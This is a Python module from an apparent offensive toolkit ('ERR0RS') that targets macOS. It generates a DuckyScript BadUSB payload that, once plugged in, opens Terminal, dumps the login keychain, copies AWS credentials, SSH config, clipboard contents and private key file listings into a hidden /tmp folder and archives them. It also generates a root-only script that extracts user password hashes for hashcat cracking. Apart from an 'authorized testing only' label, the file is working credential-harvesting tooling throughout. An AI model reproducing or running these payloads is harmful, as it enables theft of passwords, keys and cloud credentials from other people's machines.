"""
ERR0RS ULTIMATE - Apple Platform Attack Module
================================================
iOS and macOS penetration testing toolkit.

Covers:
  - macOS credential extraction (Keychain, Directory Services, browser creds)
  - iOS attack vectors (backup analysis, MDM injection, pairing exploitation)
  - BadUSB payloads specifically crafted for Apple targets
  - Hash extraction and offline cracking prep
  - Safari/iCloud credential harvesting from backups

EDUCATIONAL / AUTHORIZED TESTING ONLY.
Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import os, json, logging, base64
from pathlib import Path
from dataclasses import dataclass, field

log = logging.getLogger("errors.apple_attack")


@dataclass
class AppleCredential:
    source:      str
    service:     str = ""
    account:     str = ""
    password:    str = ""
    hash_value:  str = ""
    hash_type:   str = ""
    metadata:    dict = field(default_factory=dict)

    def to_dict(self):
        return {"source": self.source, "service": self.service,
                "account": self.account, "hash_type": self.hash_type,
                "hash_preview": self.hash_value[:32] + "..." if len(self.hash_value) > 32 else self.hash_value}


@dataclass
class AppleScanResult:
    target_type: str = ""
    os_version:  str = ""
    credentials: list = field(default_factory=list)
    hashes:      list = field(default_factory=list)
    artifacts:   list = field(default_factory=list)
    errors:      list = field(default_factory=list)


class macOSAttackModule:
    """macOS credential extraction and BadUSB payload generator."""

    BROWSER_PATHS = {
        "chrome":  "~/Library/Application Support/Google/Chrome/Default/Login Data",
        "firefox": "~/Library/Application Support/Firefox/Profiles/",
        "safari":  "~/Library/Safari/",
        "edge":    "~/Library/Application Support/Microsoft Edge/Default/Login Data",
        "brave":   "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data",
    }

    def generate_badusb_payload(self, exfil_method: str = "local") -> str:
        """Generate DuckyScript BadUSB payload for macOS. local=write to /tmp/"""
        if exfil_method == "local":
            return self._badusb_local()
        return self._badusb_display()

    def _badusb_local(self) -> str:
        return """REM ERR0RS macOS Credential Harvester - Local Mode
REM AUTHORIZED TESTING ONLY - Writes to /tmp/.errz_harvest/
DELAY 1500
GUI SPACE
DELAY 600
STRING terminal
ENTER
DELAY 1000
STRING mkdir -p /tmp/.errz_harvest 2>/dev/null
ENTER
STRING system_profiler SPSoftwareDataType | grep "System Version" > /tmp/.errz_harvest/sysinfo.txt
ENTER
STRING security list-keychains > /tmp/.errz_harvest/keychain_list.txt 2>&1
ENTER
STRING security dump-keychain ~/Library/Keychains/login.keychain-db >> /tmp/.errz_harvest/keychain_list.txt 2>&1
ENTER
STRING ls -la ~/.ssh/ > /tmp/.errz_harvest/ssh_keys.txt 2>&1
ENTER
STRING cat ~/.ssh/config >> /tmp/.errz_harvest/ssh_keys.txt 2>&1
ENTER
STRING test -f ~/.aws/credentials && cp ~/.aws/credentials /tmp/.errz_harvest/aws_creds.txt
ENTER
STRING ls ~/Library/Application\\ Support/Google/Chrome/Default/ > /tmp/.errz_harvest/chrome_profile.txt 2>&1
ENTER
STRING pbpaste > /tmp/.errz_harvest/clipboard.txt 2>&1
ENTER
STRING find ~ -maxdepth 3 -name "*.pem" -o -name "*.key" -o -name "*.p12" 2>/dev/null | head -20 > /tmp/.errz_harvest/key_files.txt
ENTER
STRING tar czf /tmp/.errz_results.tgz /tmp/.errz_harvest/ 2>/dev/null && echo "[ERR0RS] Harvest complete"
ENTER
DELAY 500
STRING exit
ENTER"""

    def _badusb_display(self) -> str:
        return """REM ERR0RS macOS Demo Payload - Display Only
DELAY 1500
GUI SPACE
DELAY 600
STRING terminal
ENTER
DELAY 1000
STRING echo "=== ERR0RS macOS Recon ==="; sw_vers; whoami; id
ENTER
STRING security list-keychains
ENTER
STRING ls ~/.ssh/ 2>/dev/null
ENTER
STRING test -f ~/.aws/credentials && echo "AWS CREDS FOUND" || echo "No AWS creds"
ENTER
STRING echo "=== Done ==="
ENTER"""

    def generate_hash_extractor(self) -> str:
        """Python script to extract PBKDF2-SHA512 hashes. Requires sudo."""
        return '''#!/usr/bin/env python3
"""ERR0RS macOS Hash Extractor - REQUIRES ROOT - Authorized testing only"""
import plistlib, os, sys, binascii, glob

DSLOCAL = "/var/db/dslocal/nodes/Default/users/"

def extract():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo python3 macos_hash_extract.py"); sys.exit(1)
    results = []
    for plist_path in glob.glob(DSLOCAL + "*.plist"):
        user = os.path.basename(plist_path).replace(".plist","")
        try:
            with open(plist_path,"rb") as f: data = plistlib.load(f)
            shadow = data.get("ShadowHashData",[])
            if not shadow: continue
            sp = plistlib.loads(bytes(shadow[0]))
            pb = sp.get("SALTED-SHA512-PBKDF2",{})
            if not pb: continue
            entropy = binascii.hexlify(bytes(pb["entropy"])).decode()
            salt    = binascii.hexlify(bytes(pb["salt"])).decode()
            iters   = pb["iterations"]
            h = f"$ml${iters}${salt}${entropy}"
            results.append({"user":user,"hash":h})
            print(f"[+] {user}: {h[:60]}...")
        except Exception as e:
            print(f"[!] {user}: {e}")
    if results:
        with open("/tmp/macos_hashes.txt","w") as f:
            [f.write(r["hash"]+"\\n") for r in results]
        print(f"[+] {len(results)} hashes -> /tmp/macos_hashes.txt")
        print("[*] Crack: hashcat -m 12100 /tmp/macos_hashes.txt wordlist.txt")
    return results

if __name__ == "__main__": extract()
'''
